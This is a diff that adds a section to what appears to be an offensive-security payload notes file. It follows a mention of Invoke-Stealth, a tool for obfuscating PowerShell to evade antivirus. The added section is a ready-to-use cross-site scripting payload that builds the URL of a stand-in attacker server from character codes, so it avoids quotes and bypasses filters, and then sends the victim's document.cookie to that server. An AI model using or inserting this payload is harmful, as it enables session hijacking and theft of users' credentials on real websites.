@@ -74,4 +74,11 @@ payloadummed.ps1.
 Invoke-Stealth generates stealthy PowerShell scripts using
 obfuscation and encryption to evade antivirus detection and execute covert operations.
 
+# XSS payload
+This means you can construct an XSS payload without quotes, like this:
+<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47, 
+47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 
+101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT>
+The String.fromCharCode() function returns a string, given an input list 
+of ASCII character codes. 
 
